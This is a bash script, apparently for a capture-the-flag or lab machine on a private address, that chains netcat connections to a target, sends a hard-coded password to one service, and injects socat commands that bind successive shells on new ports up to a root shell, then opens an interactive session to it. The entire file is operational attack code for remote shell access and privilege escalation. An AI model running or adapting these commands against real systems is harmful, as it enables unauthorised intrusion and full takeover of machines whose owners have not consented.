#!/bin/bash

echo exit | nc -n 192.168.56.101 44442 > /dev/null
err=$?
if [[ $err -ne 0 ]]
then
    echo "Spawning level2 shell"
    (echo R3sp3ctY04r4dm1niSt4t0rL1keYo4R3spectY04rG0d; sleep 1; echo 'socat TCP4-listen:44442,reuseaddr,fork EXEC:/home/level1/level2_sh &'; sleep 1; echo exit ) | nc -n 192.168.56.101 54311
    sleep 1;
fi
echo exit | nc -n 192.168.56.101 44443 > /dev/null
if [[ $? -ne 0 ]]
then
    echo "Spawning level3 shell"
    (echo id; echo 'cd /home/level2';echo 'socat TCP4-listen:44443,reuseaddr,fork EXEC:/home/level2/level3_sh &'; sleep 1; echo exit ) | nc -n 192.168.56.101 44442
    sleep 1;
fi
echo exit | nc -n 192.168.56.101 44444 > /dev/null
if [[ $? -ne 0 ]]
then
    echo "Spawning level4 shell"
    (echo id; echo 'cd /home/level3';echo 'socat TCP4-listen:44444,reuseaddr,fork EXEC:/home/level3/level4_sh &'; sleep 1; echo exit ) | nc -n 192.168.56.101 44443
    sleep 1;
fi

echo exit | nc -n 192.168.56.101 44445 > /dev/null
if [[ $? -ne 0 ]]
then
    echo "Spawning root shell"
    (echo id; echo 'cd /home/level4';echo 'socat TCP4-listen:44445,reuseaddr,fork EXEC:/home/level4/root_sh &'; sleep 1; echo exit ) | nc -n 192.168.56.101 44444
    sleep 1;
fi

(echo id; cat ) | nc -vvn 192.168.56.101 44445
